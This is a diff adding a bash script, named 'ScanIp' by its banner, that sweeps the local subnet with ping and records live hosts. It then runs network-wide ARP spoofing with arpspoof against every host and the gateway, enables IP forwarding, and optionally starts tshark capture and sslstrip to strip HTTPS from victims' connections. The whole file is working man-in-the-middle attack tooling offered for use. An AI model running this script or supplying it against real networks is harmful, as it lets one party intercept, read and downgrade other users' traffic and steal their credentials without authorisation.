@@ -1,0 +1,172 @@
+#!/bin/bash
+
+./required
+clear
+echo -e "\033[36m  ____                  ___       \033[0m"
+echo -e "\033[36m / ___|  ___ __ _ _ __ |_ _|_ __  \033[0m"
+echo -e "\033[36m \___ \ / __/ _\` | '_ \ | || '_ \ \033[0m"
+echo -e "\033[36m  ___) | (_| (_| | | | || || |_) |\033[0m"
+echo -e "\033[36m |____/ \___\__,_|_| |_|___| .__/ \033[0m"
+echo -e "\033[36m                           |_|    \033[0m"
+echo -e "\n"
+
+function loop () {
+	echo -ne "\033[36mScanning..\\r\033[0m"
+        sleep .05
+        echo -ne "\033[36mScanning..|\r\033[0m"
+        sleep .05
+        echo -ne "\033[36mScanning../\r\033[0m"
+        sleep .05
+        echo -ne "\033[36mScanning..-\r\033[0m"
+        sleep .05
+        echo -ne "\033[36mScanning..\\r\033[0m"
+        sleep .05
+        echo -ne "\033[36mScanning..|\r\033[0m"
+	#echo -ne "\033[2K"
+}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------
+jump (){								#(3)determine wheather to continue arpspoof
+echo -e "\n\033[36mType 'Y' to start network wide arpspoof.\033[0m"
+read -s p
+
+if [ $p = "y" ]
+then
+	autospoof
+
+
+
+elif [ $p != "y" ]
+then
+	echo -e "\n\033[36mClosing Script \nSaved Active Addresses In File /root/arp/online\033[0m"
+	exitfi
+fi
+}
+#-----------------------------------------------------------------------------------------------------------------------------------------------
+
+#-----------------------------------------------------------------------------------------------------------------------------------------
+pings () {								# (2) ping all ip addresses and write to file
+trap 'exitfi' INT
+for i in $GW1.$GW2.$GW3.{2..255}
+do
+	loop
+	if ping -c1 -w1 $i &>/dev/null 
+	then
+		if [ "$i" != "$Personal" ]
+		then
+			echo -e "\033[33m$i\033[0m is \033[4mOnline\033[0m"
+			echo $i >> online
+		fi
+	fi
+	
+done
+echo -ne "\033[2K"
+jump
+}
+#----------------------------------------------------------------------------------------------------------------------------------------
+
+#-----------------------------------------------------------------------------------------------------------------------------------------
+
+								#(Inturrupt) Inturrput block
+exitfi () {
+	trap SIGINT
+	ip=$(ps -a | grep "arpspoof" | awk -F " " {'print $1'}); kill $ip &>/dev/null 
+
+	echo 0 >/proc/sys/net/ipv4/ip_forward
+	echo -e "\n\n\033[36mClosing Script \nSaved Active Addresses In File /root/arp/online\033[0m"
+	echo -e "\n\n\033[36mSetting IP Forwarding to 0\nCleaning Up arptables\033[0m\n"
+
+	exit
+}
+#----------------------------------------------------------------------------------------------------------------------------------------
+
+#-----------------------------------------------------------------------------------------------------------------------------------------
+								#(4)arpspoof run
+autospoof ()
+{
+	while read i
+	do
+		
+		echo 1 >/proc/sys/net/ipv4/ip_forward
+		arpspoof -i wlan0 -t $(route -n | grep UG | awk -F " " {'print $2'}) $i  > /dev/null 2>&1 &   #./command >/dev/null 2>&1 &
+		arpspoof -i wlan0 -t $i $(route -n | grep UG | awk -F " " {'print $2'})  > /dev/null 2>&1 &
+		echo -e "arping \033[32m$i\033[0m"	
+	done < online
+	echo -e "\n\033[36mStart Tshark? NOTE: ONLY WORKS WITH DESKTOP ENVIORMENT (Y/N)\033[0m"
+	read -s shark
+	if [ "$shark" = "y" ]
+	then
+		xterm -hold -geometry 1366x768+0+0 -e "tshark -f arp" > /dev/null 2>&1 &
+		sleep 1
+		 wmctrl -a "root"
+	else
+		echo -e "\n\033[36mSkipping Tshark listener\033[0m"
+	fi
+	trap 'exitfi' INT
+	echo -e "\n\033[31mArpSpoofing in progress\nUse Ctl-C to exit script\033[0m"
+	echo -e "\n\n\033[36mWant to use sslstrip2? (Y/N)\033[0m"
+	read -s goog
+	if [ "$goog" = "y" ]
+	then
+		echo -e "\n\033[31mOpen in This window or open another window? (same/new) default:new\nRequires Desktop enviorment\033[0m"
+		read -s open
+		if [ "$open" = "same" ]
+		then
+			./sslstrip -T 
+		else
+			xterm -hold -geometry 75x40+300+0 -e "bash -f sslstrip -t"
+		fi
+	else 
+		echo -e "\n\033[36mRunning without sslstrip2\033[0m"
+	fi
+}
+#---------------------------------------------------------------------------------------------------------------------------------------
+
+#----------------------------------------------------------------------------------------------------------------------------------------
+
+								#Setting variables for GateWay and ip discovery
+
+
+sec=0
+GW1=$(route -n | grep UG | awk -F " " {'print $2'} | awk -F "." {'print $1'})
+GW2=$(route -n | grep UG | awk -F " " {'print $2'} | awk -F "." {'print $2'})
+GW3=$(route -n | grep UG | awk -F " " {'print $2'} | awk -F "." {'print $3'})
+GW4=$(route -n | grep UG | awk -F " " {'print $2'} | awk -F "." {'print $4'})
+iface=$(route -n | grep UG | awk -F " " {'print $8'})
+GateWay="$GW1.$GW2.$GW3.$GW4"
+
+
+Personal=$(ifconfig $iface | grep "inet "| awk -F " " {'print $2'})
+#----------------------------------------------------------------------------------------------------------------------------------------
+								#(1)Remove old ip address file(s)
+#-----------------------------------------------------------------------------------------------------------------------------------------
+if [ '$(wc -c online | cut -d " " -f1)'  != "0" ]
+then
+	echo -e "\033[36mDo you wish to Remove old files? (Y/N)\033[0m"
+	read -s remove
+		if [ $remove = 'y' ]
+		then
+			rm online &>/dev/null # echo  > online
+			echo -e "\n\033[36mRemoving Old Files\033[0m\n"
+			#echo -e "\n\033[31mNOTE: THIS PROGRAM USES YOUR OWN IP ADDRESS TO DERTERMINE ROUTER IP\nCHECK CONFIG IF IPSCAN NOT WORKING\033[0m"
+			echo -e "\n"
+			echo -e "\033[33mGateWay: \033[32m$GateWay\033[0m"
+			echo -e "\033[33mPersonal IP: \033[32m$Personal\033[0m"
+			echo -e "\033[33mInterface: \033[32m$iface\033[0m\n"
+			pings
+		elif [ $remove = 'n' ]
+		then
+			echo -e "\033[33m$(cat online)\033[0m" | tr " " "\n"
+			jump
+		fi
+fi
+#---------------------------------------------------------------------------------------------------------------------------------------------
+
+#----------------------------------------------------------------------------------------------------------------------------------------------
+							#(5) Keep process open
+while [ "0" = "0" ]
+do 
+	
+	sleep 1
+done 
+#---------------------------------------------------------------------------------------------------------------------------------------------
